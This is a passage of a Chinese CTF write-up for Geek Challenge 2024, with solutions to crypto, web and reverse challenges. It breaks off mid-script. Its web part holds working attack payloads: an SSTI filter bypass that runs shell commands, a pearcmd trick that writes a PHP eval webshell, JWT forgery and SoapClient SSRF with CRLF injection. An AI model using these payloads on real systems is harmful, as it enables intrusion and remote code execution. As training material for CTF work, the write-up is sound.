plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wZyyAzKowuDD1R48UelUskEv0W8AXLOHR4nni</span><br><span class="line">2uqP/7tlAPCJrMVD8zoRsRviyUnqO6y7cV7G0Fo1AoGBALpb6vOC9Ya/BEYV8+yL</span><br><span class="line">814K0KQc7LITkwqGrDWoDZAxmgWqVtoxHuhDWr5jF+ttFZBPx4fTezTEjarXXSt3</span><br><span class="line">pB1c7EwnzO0Hy9qJH++g2dcCUCO8uGXBbAACZqCQZAAydSrM5zozWAYMBWcj54j0</span><br><span class="line">LtyOEg4PWPXiTzJ//xxWaH+xAoGBAKFGRIyYD89JvlZA6oz7YnjzsnDlTq01td32</span><br><span class="line">XAuw62dZQHWmg1npC3YtzFlgTyNY2QelObmryyc2vFnxVhTYcDXFLQwrX8X5YV4A</span><br><span class="line">rFAAlyzxpNzYPzDHrdqLD6PhMU+wRuHVPyAtNBsL0N+mgQcsWJJvngSTHg86kJOl</span><br><span class="line">HlNuLBGhAoGAFiG3VR+lubcPvXOVAvkt+c8rF6qcmXlb2Og0hNwDJ2roX98aqOVy</span><br><span class="line">p5AWGPoA1siI4/RPIp1ClfEwKMjraun1ZJs/jKemaQk2hdhWkQ+6QinvUJbA1Lqm</span><br><span class="line">TcRmKa1emY/U6I8ce6N69e7ver1DV4I/ugSahJlZT/JRyF5qj1uVZ/k=</span><br></pre></td></tr></table></figure><p>去掉w转16进制：</p><p><code>672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a3502818100ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb102818100a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a10281801621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9</code></p><p>按照私钥结构分割：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">672c80ccaa30b830f5478f147a552c904bf45bc0172ce1d1e279e2daea8fffbb6500f089acc543f33a11b11be2c949ea3bacbb715ec6d05a35</span><br><span class="line">028181</span><br><span class="line">00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1 (dp)</span><br><span class="line">028181</span><br><span class="line">00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1 (dq)</span><br><span class="line">028180</span><br><span class="line">1621b7551fa5b9b70fbd739502f92df9cf2b17aa9c99795bd8e83484dc03276ae85fdf1aa8e572a7901618fa00d6c888e3f44f229d4295f13028c8eb6ae9f5649b3f8ca7a669093685d856910fba4229ef5096c0d4baa64dc46629ad5e998fd4e88f1c7ba37af5eeef7abd4357823fba049a8499594ff251c85e6a8f5b9567f9</span><br></pre></td></tr></table></figure><p>有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp = <span class="number">0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1</span></span><br><span class="line">dq = <span class="number">0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1</span></span><br></pre></td></tr></table></figure><p>生成完整私钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x3ebcefe91cb56a985a514dacefe4e048c1e805a6a3a1afcdc405812044dce1ce247b1de001b77dcb83ff3f38b392dab34f0d2aabdcb2afe670f104b2dfa04c2ff88b563804993f5ce2babd8a81dbde7f99ffacbfb6a77723a84e6c7d758a4d89667b6e0f9308c9c154b8f8fdafa224fc9364ba2995ab5a4a8a608b43bffa1ae9007ffb224aa45485f861eed1cdfaa34efefdcb03cb12501a7f9ffd2336d86b12339c3ec8ea9f321d6d6a3df566f3325205c7ec84dffc107eabb5b06fcededa419914c61987c0ae11d502fe91846efd548bc1dc9fab733f838fe27e5f0a5452f1cd79e6d3b125f060aef698c30484aa386d6aa44e12871cb2b20ef3bebad1a90c</span></span><br><span class="line">dp = <span class="number">0x00ba5beaf382f586bf044615f3ec8bf35e0ad0a41cecb213930a86ac35a80d90319a05aa56da311ee8435abe6317eb6d15904fc787d37b34c48daad75d2b77a41d5cec4c27cced07cbda891fefa0d9d7025023bcb865c16c000266a090640032752acce73a3358060c056723e788f42edc8e120e0f58f5e24f327fff1c56687fb1</span></span><br><span class="line">dq = <span class="number">0x00a146448c980fcf49be5640ea8cfb6278f3b270e54ead35b5ddf65c0bb0eb67594075a68359e90b762dcc59604f2358d907a539b9abcb2736bc59f15614d87035c52d0c2b5fc5f9615e00ac5000972cf1a4dcd83f30c7adda8b0fa3e1314fb046e1d53f202d341b0bd0dfa681072c58926f9e04931e0f3a9093a51e536e2c11a1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="keyword">if</span>(e*dp%x==<span class="number">1</span>):</span><br><span class="line">        p=(e*dp-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n%p!=<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q=n//p</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line"> </span><br><span class="line">rsa_components = (n, e, d, p, q)</span><br><span class="line">myrsa = RSA.construct(rsa_components)</span><br><span class="line"></span><br><span class="line">private = <span class="built_in">open</span>(<span class="string">&#x27;private1.pem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(myrsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>openssl解 <code>key.enc</code>：</p><p><code>openssl rsautl -decrypt -inkey private1.pem -in key.enc</code></p><p>得到： <code>You_are_r1ght_bu7_Genshin_Impact_1s_@_brand_new_open_wor1d_@dventure_gam3_dev3loped_6y_miHoYo.</code></p><p>作为密码，提取 <code>Ginshen.exe</code> 中的 <code>Ginshen.txt</code>，末尾即为flag： <code>SYC&#123;OVvanSh3nO_Q1D0ng!&#125;</code>。</p><p>​</p><h3 id="ECBpad"><a href="#ECBpad" class="headerlink" title="ECBpad"></a>ECBpad</h3><blockquote><p>点击就送！！！！！</p></blockquote><p>ECB模式攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">45839</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">leng</span>):</span><br><span class="line">    pad_len = block - (leng % block) <span class="keyword">if</span>  leng % block != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;F&#x27;</span> * pad_len</span><br><span class="line"></span><br><span class="line">secret_len = <span class="number">31</span></span><br><span class="line">ori_padding_len = <span class="number">1</span></span><br><span class="line">block = <span class="number">16</span></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">padding = [pad(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">padding = padding[<span class="number">1</span>:]+[padding[<span class="number">0</span>]]</span><br><span class="line"><span class="built_in">print</span>(padding)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(secret_len):</span><br><span class="line">    find=<span class="number">0</span></span><br><span class="line">    payload = <span class="string">b&#x27;*&#x27;</span>*(ori_padding_len+i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    group = i//block</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your cipher:&#x27;</span>)</span><br><span class="line">    data = r.recvline().strip()</span><br><span class="line">    <span class="keyword">if</span> group == <span class="number">0</span>:</span><br><span class="line">        prob=data[-<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        prob=(data[-<span class="number">32</span>*(group+<span class="number">1</span>):-<span class="number">32</span>*(group+<span class="number">1</span>)+<span class="number">32</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> prob = <span class="subst">&#123;prob&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> trange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        flag_suffix = flag[:<span class="built_in">min</span>(<span class="built_in">len</span>(flag),<span class="number">15</span>)]</span><br><span class="line">        payload = <span class="built_in">bytes</span>([j]) + flag_suffix + padding[<span class="built_in">min</span>(<span class="built_in">len</span>(flag_suffix),<span class="number">15</span>)]</span><br><span class="line">        <span class="comment">#print(j,payload)</span></span><br><span class="line">        r.sendlineafter(<span class="string">b&#x27;[-] &#x27;</span>,payload)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Your cipher:&#x27;</span>)</span><br><span class="line">        data = r.recvline().strip()</span><br><span class="line">        <span class="keyword">if</span> data[:<span class="number">32</span>]==prob:</span><br><span class="line">            flag = <span class="built_in">bytes</span>([j]) + flag</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> flag = <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            find=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> find == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> cannot find!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 31 flag = b&#x27;SYC&#123;CRY9T0HACK_A_GREA7_W38S17E&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h3><blockquote><p>原本第一周的签到题放第二周给大家爽爽吧，点击就送</p></blockquote><p>分步补充HTTP请求头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /?welcome=geekchallenge2024</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://www.sycsec.com</span><br><span class="line"><span class="attribute">X-Real-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Starven</span><span class="punctuation">: </span>I_Want_Flag</span><br><span class="line"></span><br><span class="line">username=Starven&amp;password=qwert123456</span><br></pre></td></tr></table></figure><p>得到：</p><p><code>give your cookie : token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDI0MDEsIm5iZiI6MTczMDIwMjQwMSwiZXhwIjoxNzMwMjA5NjAxLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.y-NlvKN8YH29AHLCFDboNz9WsXuPeUL2fzbmRHrfOAw&lt;br&gt;&lt;!--key is &quot;Starven_secret_key&quot;--&gt;&lt;br&gt;</code></p><p>到 jwt.io，使用key修改jwt为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;iss&quot;: &quot;Starven&quot;,</span><br><span class="line">  &quot;aud&quot;: &quot;Ctfer&quot;,</span><br><span class="line">  &quot;iat&quot;: 1729859281,</span><br><span class="line">  &quot;nbf&quot;: 1729859281,</span><br><span class="line">  &quot;exp&quot;: 1729866481,</span><br><span class="line">  &quot;username&quot;: &quot;Starven&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;qwert123456&quot;,</span><br><span class="line">  &quot;hasFlag&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到后修改cookie得到flag：</p><p><code>Cookie: token = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3MzAyMDIzMTAsIm5iZiI6MTczMDIwMjMxMCwiZXhwIjoxNzMwMjA5NTEwLCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.8BOl75G67rPQZ2pd2Eq9eTfVYeNJ6QXu3dsYQA6I0cE</code></p><p>​</p><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><blockquote><p>听GSBP师傅说你是ssti糕手,那就来秒了他</p></blockquote><p>提交表单完成，返回值为200，需要分割绕过 <code>__</code>，<code>|attr</code> 绕过 <code>.</code>，以及16进制绕关键字。</p><p>输入Payload:</p><p><code>&#123;%print(joiner|attr('_''_init__')|attr('_''_globals__'))|attr('__g''etitem__')('_''_builtins__')|attr('__g''etitem__')('__import__')('o''s')|attr('p''open')('\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x7c\x62\x61\x73\x65\x36\x34')|attr('r''ead')()%&#125;</code></p><p>得到结果base64解码为flag。</p><p>​</p><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><blockquote><p>web安全修仙之路-听说你学了文件包含？秒了这道题你就进入筑基阶段了</p></blockquote><p>第一步，包含的软连接层数较多时，hash匹配会直接失效造成重复包含：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</code></p><p>base64解码得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;congratulation! you can goto /levelllll2.php to capture the flag!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二步，根据提示 <code>register_argc_argv = On</code> 和 <code>pearcmd</code>：</p><p>用pearcmd写入文件：</p><p><code>/levelllll2.php?+config-create+/&amp;syc=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_GET[1]);?&gt;+/tmp/1.php</code></p><p>再访问：</p><p><code>/levelllll2.php?1=system(&quot;env&quot;);&amp;syc=/tmp/1.php</code></p><p>得到flag。</p><p>​</p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h3><blockquote><p>听说这运维一点安全不会</p></blockquote><p>F12查看源码有注释：</p><p><code>&lt;!-- 老板非说要防止黑客攻击，把后台登录路由改成了L000G1n.php，每次登录的时候都记不住，就放这里了吧，应该没人看见 --&gt;</code></p><p>访问 <code>L000G1n.php</code>，密码格式为：三位字母+@chengxing，上burpsuite爆破，得到密码：<code>SYC@chengxing</code>。</p><p>进入后台页面，广告修改功能，修改源码为：<code>echo readgzfile(&quot;/flag&quot;);</code>，回到首页底部看到flag。</p><p>​</p><h3 id="ez-SSRF"><a href="#ez-SSRF" class="headerlink" title="ez_SSRF"></a>ez_SSRF</h3><blockquote><p>lhRaMk7写了个计算器网站用来通过他的小升初数学考试，Parar看不惯直接黑了他的网站不给他作弊，你们觉得能让他作弊吗</p></blockquote><p><code>/www.zip</code> 源码泄露，发现对外用的是 <code>h4d444444.php</code>，对内用的是 <code>calculator.php</code>。</p><p>Soapclient+SSRF，控制User-Agent，实现CRLF伪造，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a>。</p><p>修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/calculator.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;expression=`cat /flag`&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$aaa</span> = <span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%20&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h4d333333.php?location=http://127.0.0.1/calculator.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-21b464e7-4ccf-4895-803d-98e820b7e112.challenge.ctfplus.cn</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">user<span class="operator">=</span>wupco<span class="variable">%0</span>d<span class="variable">%0</span>aContent-Type:<span class="variable">%20</span>application/<span class="keyword">x</span>-www-form-urlencoded<span class="variable">%0</span>d<span class="variable">%0</span>aAuthorization:<span class="variable">%20</span>Basic<span class="variable">%20</span>YWFhYWFhYWFhYWFhZG<span class="number">1</span>pbjppX<span class="number">3</span>dhbnRfdG<span class="number">9</span>fZ<span class="number">2</span>V<span class="number">0</span>STAwX<span class="number">2</span>luTXlUM<span class="number">3</span>N<span class="number">0</span><span class="variable">%0</span>d<span class="variable">%0</span>aContent-Length:<span class="variable">%2022</span><span class="variable">%0</span>d<span class="variable">%0</span>a<span class="variable">%0</span>d<span class="variable">%0</span>aexpression<span class="operator">=</span>`cat<span class="variable">%20</span>/flag`</span></span><br></pre></td></tr></table></figure><p>最后访问 <code>/result</code> 下载得到flag。</p><p>​</p><h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="长颈鹿喜欢吃彩虹"><a href="#长颈鹿喜欢吃彩虹" class="headerlink" title="长颈鹿喜欢吃彩虹"></a>长颈鹿喜欢吃彩虹</h3><blockquote><p>长颈鹿想吃彩虹了，可以帮他它长高吃到彩虹吗，它肯定会给你彩虹糖的</p></blockquote><p>ollvm，动调得到key和密文后，发现是一个简单的异或逻辑，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">b&#x27;BOb0m0oN&#x27;</span></span><br><span class="line">c = [<span class="number">0x1D</span>, <span class="number">0x36</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0x49</span>, <span class="number">0x2D</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x42</span>, <span class="number">0x2C</span>, <span class="number">0x76</span>, <span class="number">0x07</span>, <span class="number">0x10</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0x39</span>, <span class="number">0x55</span>, <span class="number">0x32</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x03</span>, <span class="number">0x1B</span>, <span class="number">0x1D</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1D</span>, <span class="number">0x3F</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = [c[i]^k[i%<span class="built_in">len</span>(k)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag[::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;yOU_girAFe_L0Ve_EaT_W0bN1aR&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="奇怪的RC4"><a href="#奇怪的RC4" class="headerlink" title="奇怪的RC4"></a>奇怪的RC4</h3><blockquote><p>指令敲一次？不！敲两次！</p></blockquote><p>python解包+pyc反编译，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Rc4 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor1</span>(<span class="params">plaintext, xor_list</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xor_list = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> xor_list]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span 